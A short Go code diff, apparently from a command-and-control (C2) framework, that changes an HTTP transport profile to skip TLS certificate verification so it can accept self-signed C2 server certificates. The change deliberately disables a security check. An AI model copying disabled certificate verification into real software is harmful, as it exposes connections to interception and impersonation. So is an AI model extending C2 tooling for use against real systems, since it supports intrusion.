@@ -8,6 +8,7 @@ import (
 	"crypto/hmac"
 	"crypto/rand"
 	"crypto/sha256"
+	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -142,7 +143,9 @@ func NewHTTPXProfile(
 	}
 
 	transport := &http.Transport{
-		TLSClientConfig:     nil, // Uses system defaults
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true, // Skip TLS verification for self-signed C2 certs
+		},
 		MaxIdleConns:        10,
 		MaxIdleConnsPerHost: 5,
 		IdleConnTimeout:     90 * time.Second,
